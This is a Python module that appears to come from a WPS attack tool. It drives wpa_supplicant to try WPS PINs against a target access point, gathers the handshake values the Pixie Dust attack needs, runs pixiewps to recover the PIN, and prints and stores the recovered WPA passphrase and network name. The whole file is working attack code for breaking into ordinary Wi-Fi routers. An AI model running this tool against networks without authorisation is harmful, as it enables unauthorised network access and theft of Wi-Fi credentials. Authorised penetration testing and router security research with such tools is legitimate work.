import socket
import tempfile
import os
import subprocess
import time
import shutil
import sys
import codecs
import src.wps.pixiewps
import src.wps.generator
import src.utils
import src.collector

class ConnectionStatus:
    def __init__(self):
        self.STATUS = ''
        self.LAST_M_MESSAGE = 0
        self.ESSID = ''
        self.BSSID = ''
        self.WPA_PSK = ''

    def isFirstHalfValid(self) -> bool:
        return self.LAST_M_MESSAGE > 5

    def clear(self):
        self.__init__()

class Initialize:
    def __init__(self, interface: str, write_result: bool = False, save_result: bool = False, print_debug: bool = False):
        self.INTERFACE    = interface
        self.WRITE_RESULT = write_result
        self.SAVE_RESULT  = save_result
        self.PRINT_DEBUG  = print_debug

        self.CONNECTION_STATUS = ConnectionStatus()
        self.PIXIE_CREDS  = src.wps.pixiewps.Data()
        self.TEMPDIR = tempfile.mkdtemp()

        try:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
                temp.write(f'ctrl_interface={self.TEMPDIR}\nctrl_interface_group=root\nupdate_config=1\n')
                self.TEMPCONF = temp.name

            self.WPAS_CTRL_PATH = f'{self.TEMPDIR}/{self.INTERFACE}'
            self._initWpaSupplicant()

            self.RES_SOCKET_FILE = f'{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}'
            self.RETSOCK = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
            self.RETSOCK.bind(self.RES_SOCKET_FILE)
        except Exception as e:
            print(f'[!] Initialization failed: {e}')
            self._cleanup()
            raise

        self.DISCONNECT_COUNT = 0

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_value, traceback):
        self._cleanup()

    @staticmethod
    def _getHex(line: str) -> str:
        parts = line.split(':', 3)
        if len(parts) > 2:
            return parts[2].replace(' ', '').upper()
        return ''

    @staticmethod
    def _explainWpasNotOkStatus(command: str, respond: str):
        if command.startswith(('WPS_REG', 'WPS_PBC')):
            if respond == 'UNKNOWN COMMAND':
                return ('[!] It looks like your wpa_supplicant is compiled without WPS protocol support. '
                        'Please build wpa_supplicant with WPS support ("CONFIG_WPS=y")')
        return '[!] Something went wrong — check out debug log'

    @staticmethod
    def _credentialPrint(wps_pin: str = None, wpa_psk: str = None, essid: str = None):
        print(f'[+] WPS PIN: \'{wps_pin}\'')
        print(f'[+] WPA PSK: \'{wpa_psk}\'')
        print(f'[+] AP SSID: \'{essid}\'')

    def singleConnection(self, bssid: str = None, pin: str = None, pixiemode: bool = False, showpixiecmd: bool = False,
                         pixieforce: bool = False, pbc_mode: bool = False, store_pin_on_fail: bool = False) -> bool:
        pixiewps_dir = src.utils.PIXIEWPS_DIR
        generator    = src.wps.generator.WPSpin()
        collector    = src.collector.WiFiCollector()

        if pin is None:
            if pixiemode:
                try:
                    filename = f'''{pixiewps_dir}{bssid.replace(':', '').upper()}.run'''
                    with open(filename, 'r', encoding='utf-8') as file:
                        t_pin = file.readline().strip()
                        if input(f'[?] Use previously calculated PIN {t_pin}? [n/Y] ').lower() != 'n':
                            pin = t_pin
                        else:
                            raise FileNotFoundError
                except FileNotFoundError:
                    pin = generator.getLikely(bssid) or '12345670'
            elif not pbc_mode:
                pin = generator.promptPin(bssid) or '12345670'

        try:
            if pbc_mode:
                self._wpsConnection(bssid, pbc_mode=pbc_mode)
                bssid = self.CONNECTION_STATUS.BSSID
                pin = '<PBC mode>'
            else:
                self._wpsConnection(bssid, pin, pixiemode)
        except KeyboardInterrupt:
            print('\nAborting…')
            if store_pin_on_fail and not pbc_mode and pin:
                collector.writePin(bssid, pin)
            return False

        if self.CONNECTION_STATUS.STATUS == 'GOT_PSK':
            self._credentialPrint(pin, self.CONNECTION_STATUS.WPA_PSK, self.CONNECTION_STATUS.ESSID)
            if self.WRITE_RESULT:
                collector.writeResult(bssid, self.CONNECTION_STATUS.ESSID, pin, self.CONNECTION_STATUS.WPA_PSK)
            if self.SAVE_RESULT:
                collector.addNetwork(bssid, self.CONNECTION_STATUS.ESSID, self.CONNECTION_STATUS.WPA_PSK)
            if not pbc_mode:
                try:
                    filename = f'''{pixiewps_dir}{bssid.replace(':', '').upper()}.run'''
                    os.remove(filename)
                except FileNotFoundError:
                    pass
            return True

        if pixiemode:
            if self.PIXIE_CREDS.getAll():
                pin = self.PIXIE_CREDS.runPixieWps(showpixiecmd, pixieforce)
                if pin:
                    return self.singleConnection(bssid, pin, pixiemode=False, store_pin_on_fail=True)
                return False
            else:
                print('[!] Not enough data to run Pixie Dust attack')
                return False
        else:
            if store_pin_on_fail:
                collector.writePin(bssid, pin)
            return False

    def _initWpaSupplicant(self):
        print('[*] Running wpa_supplicant…')
        wpa_supplicant_cmd = [
            'wpa_supplicant', '-K', '-d',
            '-Dnl80211,wext,hostapd,wired',
            f'-i{self.INTERFACE}',
            f'-c{self.TEMPCONF}'
        ]

        try:
            self.WPAS = subprocess.Popen(wpa_supplicant_cmd,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                encoding='utf-8'
            )
        except FileNotFoundError:
            print('[!] wpa_supplicant not found. Make sure it is installed and in your PATH.')
            raise
        except (subprocess.CalledProcessError, Exception) as error:
            print (f'[!] Failed to open wpa_supplicant \n {error}')
            raise

        start_time = time.time()
        while True:
            if time.time() - start_time > 10:
                print('[!] wpa_supplicant control interface timed out.')
                if self.WPAS.poll() is None:
                    self.WPAS.terminate()
                raise RuntimeError("wpa_supplicant failed to initialize")
                
            ret = self.WPAS.poll()
            if ret is not None and ret != 0:
                print(f'[!] wpa_supplicant returned an error: \n {self.WPAS.communicate()[0]}')
                raise RuntimeError("wpa_supplicant exited unexpectedly")
            if os.path.exists(self.WPAS_CTRL_PATH):
                break
            time.sleep(.1)

    def _sendAndReceive(self, command: str) -> str:
        self.RETSOCK.settimeout(10.0)
        try:
            self.RETSOCK.sendto(command.encode(), self.WPAS_CTRL_PATH)
            (b, _address) = self.RETSOCK.recvfrom(4096)
            inmsg = b.decode('utf-8', errors='replace')
            return inmsg
        except socket.timeout:
            print('[!] wpa_supplicant socket timeout.')
            return 'FAIL'

    def _sendOnly(self, command: str):
        try:
            self.RETSOCK.sendto(command.encode(), self.WPAS_CTRL_PATH)
        except socket.error as e:
            if self.PRINT_DEBUG:
                print(f"[!] Socket send error: {e}")


    def _handleWpas(self, pixiemode: bool = False, pbc_mode: bool = False, verbose: bool = None) -> bool:
        line = self.WPAS.stdout.readline()
        if not verbose:
            verbose = self.PRINT_DEBUG
        if not line:
            self.WPAS.wait()
            return False

        line = line.rstrip('\n')

        if verbose:
            sys.stderr.write(line + '\n')

        if line.startswith('WPS: '):
            return self._handle_wps_messages(line, pixiemode)

        return self._handle_connection_states(line, pbc_mode)

    def _handle_wps_messages(self, line: str, pixiemode: bool) -> bool:
        if 'M2D' in line:
            print('[-] Received WPS Message M2D')
            src.utils.die('[!] Error: AP is not ready yet, try later')

        if 'Building Message M' in line:
            try:
                n = int(line.split('Building Message M')[1])
                self.CONNECTION_STATUS.LAST_M_MESSAGE = n
                print(f'[*] Sending WPS Message M{n}…')
            except (IndexError, ValueError):
                pass
        elif 'Received M' in line:
            try:
                n = int(line.split('Received M')[1])
                self.CONNECTION_STATUS.LAST_M_MESSAGE = n
                print(f'[*] Received WPS Message M{n}')
                if n == 5:
                    print('[*] The first half of the PIN is valid')
            except (IndexError, ValueError):
                pass
        elif 'Received WSC_NACK' in line:
            self.CONNECTION_STATUS.STATUS = 'WSC_NACK'
            print('[-] Received WSC NACK')
            print('[!] Error: wrong PIN code')
        elif 'Enrollee Nonce' in line and 'hexdump' in line:
            self._handle_pixie_data('E_NONCE', line, 16 * 2, pixiemode)
        elif 'DH own Public Key' in line and 'hexdump' in line:
            self._handle_pixie_data('PKR', line, 192 * 2, pixiemode)
        elif 'DH peer Public Key' in line and 'hexdump' in line:
            self._handle_pixie_data('PKE', line, 192 * 2, pixiemode)
        elif 'AuthKey' in line and 'hexdump' in line:
            self._handle_pixie_data('AUTHKEY', line, 32 * 2, pixiemode)
        elif 'E-Hash1' in line and 'hexdump' in line:
            self._handle_pixie_data('E_HASH1', line, 32 * 2, pixiemode)
        elif 'E-Hash2' in line and 'hexdump' in line:
            self._handle_pixie_data('E_HASH2', line, 32 * 2, pixiemode)
        elif 'Network Key' in line and 'hexdump' in line:
            self.CONNECTION_STATUS.STATUS = 'GOT_PSK'
            self.CONNECTION_STATUS.WPA_PSK = bytes.fromhex(self._getHex(line)).decode('utf-8', errors='replace')
        return True

    def _handle_connection_states(self, line: str, pbc_mode: bool) -> bool:
        if ': State: ' in line and '-> SCANNING' in line:
            self.CONNECTION_STATUS.STATUS = 'scanning'
            print('[*] Scanning…')
        elif ('WPS-FAIL' in line) and (self.CONNECTION_STATUS.STATUS != ''):
            self.CONNECTION_STATUS.STATUS = 'WPS_FAIL'
            print('[-] wpa_supplicant returned WPS-FAIL')
        elif 'Trying to authenticate with' in line:
            self.CONNECTION_STATUS.STATUS = 'authenticating'
            if 'SSID' in line:
                self.CONNECTION_STATUS.ESSID = self._decode_essid(line)
            print('[*] Authenticating…')
        elif 'Authentication response' in line:
            print('[*] Authenticated')
        elif 'Trying to associate with' in line:
            self.CONNECTION_STATUS.STATUS = 'associating'
            if 'SSID' in line:
                self.CONNECTION_STATUS.ESSID = self._decode_essid(line)
            print('[*] Associating with AP…')
        elif ('Associated with' in line) and (self.INTERFACE in line):
            bssid = line.split()[-1].upper()
            if self.CONNECTION_STATUS.ESSID:
                print(f'[+] Associated with {bssid} (ESSID: {self.CONNECTION_STATUS.ESSID})')
            else:
                print(f'[+] Associated with {bssid}')
        elif 'EAPOL: txStart' in line:
            self.CONNECTION_STATUS.STATUS = 'eapol_start'
            print('[*] Sending EAPOL Start…')
        elif 'EAP entering state IDENTITY' in line:
            print('[*] Received Identity Request')
        elif 'using real identity' in line:
            print('[*] Sending Identity Response…')
        elif 'WPS-TIMEOUT' in line:
            print('[-] Received WPS-TIMEOUT. Something might be wrong with the interface ⚠')
        elif 'NL80211_CMD_DEL_STATION' in line:
            self.DISCONNECT_COUNT += 1
            if self.DISCONNECT_COUNT == 5:
                print('[-] Received NL80211 DEL_STATION too many times. There is interference ⚠')
        elif pbc_mode and ('selected BSS ' in line):
            bssid = line.split('selected BSS ')[-1].split()[0].upper()
            self.CONNECTION_STATUS.BSSID = bssid
            print(f'[*] Selected AP: {bssid}')
        return True

    def _handle_pixie_data(self, attr: str, line: str, expected_len: int, pixiemode: bool):
        hex_value = self._getHex(line)
        if hex_value and len(hex_value) == expected_len:
            setattr(self.PIXIE_CREDS, attr, hex_value)
            if pixiemode:
                print(f'[P] {attr}: {hex_value}')

    def _decode_essid(self, line: str) -> str:
        try:
            return codecs.decode(
                '\''.join(line.split('\'')[1:-1]),
                'unicode-escape'
            ).encode('latin1').decode('utf-8', errors='replace')
        except Exception:
            return "ESSID_DECODE_FAIL"

    def _wpsConnection(self, bssid: str = None, pin: str = None, pixiemode: bool = False,
                       pbc_mode: bool = False, verbose: bool = None) -> bool:
        self.PIXIE_CREDS.clear()
        self.CONNECTION_STATUS.clear()
        
        try:
            self.WPAS.stdout.read(300)
        except Exception:
            pass 

        if not verbose:
            verbose = self.PRINT_DEBUG

        if pbc_mode:
            if bssid:
                print(f'[*] Starting WPS push button connection to {bssid}…')
                cmd = f'WPS_PBC {bssid}'
            else:
                print('[*] Starting WPS push button connection…')
                cmd = 'WPS_PBC'
        else:
            print(f'[*] Trying PIN \'{pin}\'…')
            cmd = f'WPS_REG {bssid} {pin}'

        r = self._sendAndReceive(cmd)
        if 'OK' not in r:
            self.CONNECTION_STATUS.STATUS = 'WPS_FAIL'
            print(self._explainWpasNotOkStatus(cmd, r))
            return False

        WPS_TIMEOUT = 120
        start_time = time.time()
        while True:
            if time.time() - start_time > WPS_TIMEOUT:
                print(f'[!] WPS connection attempt timed out after {WPS_TIMEOUT} seconds.')
                self.CONNECTION_STATUS.STATUS = 'WPS_TIMEOUT'
                break

            res = self._handleWpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose)
            if not res:
                break
            if self.CONNECTION_STATUS.STATUS in ('WSC_NACK', 'GOT_PSK', 'WPS_FAIL'):
                break

        self._sendOnly('WPS_CANCEL')
        return False

    def _cleanup(self):
        try:
            if hasattr(self, 'RETSOCK'):
                self.RETSOCK.close()
            if hasattr(self, 'WPAS') and self.WPAS.poll() is None:
                self.WPAS.terminate()
                self.WPAS.wait(timeout=2)
        except Exception:
            pass

        try:
            if hasattr(self, 'RES_SOCKET_FILE') and os.path.exists(self.RES_SOCKET_FILE):
                os.remove(self.RES_SOCKET_FILE)
            if hasattr(self, 'TEMPDIR') and os.path.isdir(self.TEMPDIR):
                shutil.rmtree(self.TEMPDIR, ignore_errors=True)
            if hasattr(self, 'TEMPCONF') and os.path.exists(self.TEMPCONF):
                os.remove(self.TEMPCONF)
        except Exception:
            pass

    def __del__(self):
        self._cleanup()